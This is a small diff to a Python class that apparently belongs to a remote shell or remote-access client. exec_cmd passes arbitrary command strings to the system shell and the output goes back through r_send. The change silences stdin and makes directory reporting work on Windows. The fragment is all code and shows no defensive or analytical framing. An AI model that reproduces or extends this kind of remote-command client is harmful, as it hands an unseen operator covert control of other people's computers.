@@ -100,7 +100,8 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
     
             
     def exec_cmd(self, cmd):
-        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, )
+        DEVNULL = open(os.devnull,"wb")
+        res = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=DEVNULL)
         stdout = res.stdout.read().decode().strip()
         stderr = res.stderr.read().decode().strip()
         if stdout:
@@ -138,7 +139,7 @@ uYe3LoP7wDayhDqmdh8O5QzsT93q9V7YwQw1OjQqA20XH+J08nSCjevs/20=
     def change_dir(self,dirr):
         try:
             os.chdir(dirr)
-            self.r_send(self.exec_cmd("pwd"))
+            self.r_send(self.exec_cmd("cd"))
         except Exception as e:
             self.r_send(str(e))
         
